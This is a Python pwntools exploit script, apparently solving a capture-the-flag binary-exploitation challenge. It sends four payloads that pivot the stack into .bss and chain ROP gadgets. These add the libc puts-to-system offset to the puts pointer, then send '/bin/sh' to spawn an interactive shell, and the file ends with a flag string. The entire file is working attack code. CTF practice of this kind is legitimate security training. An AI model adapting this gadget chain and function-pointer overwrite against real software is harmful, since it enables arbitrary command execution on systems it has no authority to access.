from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./vuln_patched', '''
    b *0x40120c
    b *0x40121f
    continue
''')

# p = remote('smiley.cat', 42447)

glibc_e = ELF('./libc.so.6')
LIBC_START_MAIN = 0x40109d # and rsp, 0xfffffffffffffff0; push rax; push rsp; xor r8d, r8d; xor ecx, ecx; mov rdi, 0x4011cf; call qword ptr [rip + 0x2f3b]
POP_RBP_RET = 0x401181 # pop rbp; ret
RET = 0x401182 # ret
MAIN_READ_PUTS = 0x401205 # lea rax, [rbp - 0x20]; mov rdi, rax; call 0x401183; mov rdx, qword ptr [rip + 0x2df8]; lea rax, [rbp - 0x20]; mov rdi, rax; call rdx; mov eax, 0x0; leave; ret
GADGET_1 = 0x40114c # adc edx, dword ptr [rbp + 0x48]; mov ebp, esp; call 0x4010d0; mov byte ptr [rip + 0x2ec3], 1; pop rbp; ret;
GADGET_2 = 0x40115c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
BSS_FAKE_RBP_ADDR = 0x404000 + 0x1000 # fake saved rbp value 0x405000
BSS_STACK_PIVOT_ADDR = 0x404000 + 0x800 # stack pivot to 0x404800 always, accommodate the stack frame of multiple function calls later; prevent the rsp from underflowing too much into the non-writable region
TARGET_ADDR = 0x404010 # target address 0x404010, which the puts() is called from

# Stage 1
payload1 = b'A' * 0x20
payload1 += p64(BSS_FAKE_RBP_ADDR) # fake saved rbp value 0x405000
payload1 += p64(POP_RBP_RET) + p64(BSS_STACK_PIVOT_ADDR) # rbp=0x404800
payload1 += p64(MAIN_READ_PUTS) # return to 0x401205 in main function: trigger another read() and puts(), puts() is called from 0x404010
p.send(payload1)
pause()

# Stage 2
payload2 = b'B' * 0x18
payload2 += p64(0x100000000 - (glibc_e.sym['puts'] - glibc_e.sym['system'])) # store the difference -(glibc_puts_addr-glibc_system_addr) in 0x404800-0x20+0x18=0x4047e8 for later use
payload2 += p64(BSS_FAKE_RBP_ADDR) # fake saved rbp value 0x405000
payload2 += p64(POP_RBP_RET) + p64(BSS_STACK_PIVOT_ADDR - 0x20 + 0x18 - 0x48) # rbp=0x4047e8-0x48=0x4047a0
payload2 += p64(GADGET_1) + p64(0) # rbx=*(rbp+0x48)=*0x4047a0=-(glibc_puts_addr-glibc_system_addr)=0x2f490; rbp=0
payload2 += p64(LIBC_START_MAIN) # trigger main function totally
p.send(payload2)
pause()

# Stage 3
payload3  = b'C' * 0x20
payload3 += p64(BSS_FAKE_RBP_ADDR) # fake saved rbp value 0x405000
payload3 += p64(POP_RBP_RET) + p64(TARGET_ADDR + 0x3d) # rbp=0x404010+0x3d=0x40404d
payload3 += p64(GADGET_2) # *(rbp-0x3d)=*(rbp-0x3d)+rbx: *0x404010=glibc_puts_addr-(glibc_puts_addr-glibc_system_addr)=glibc_system_addr
payload3 += p64(POP_RBP_RET) + p64(BSS_STACK_PIVOT_ADDR) # rbp=0x404800
payload3 += p64(RET) # 0x10 bytes stack alignment
payload3 += p64(MAIN_READ_PUTS) # return to 0x401205 in main function: trigger another read() and puts(), puts() is called from 0x404010, which is system() now
p.send(payload3)
pause()

# Stage 4
p.send(b'/bin/sh\x00') # trigger system("/bin/sh")

p.interactive()

# .;,;.{aaaaaaa_(╯°□°)╯︵ ┻━┻_aaaaaaa}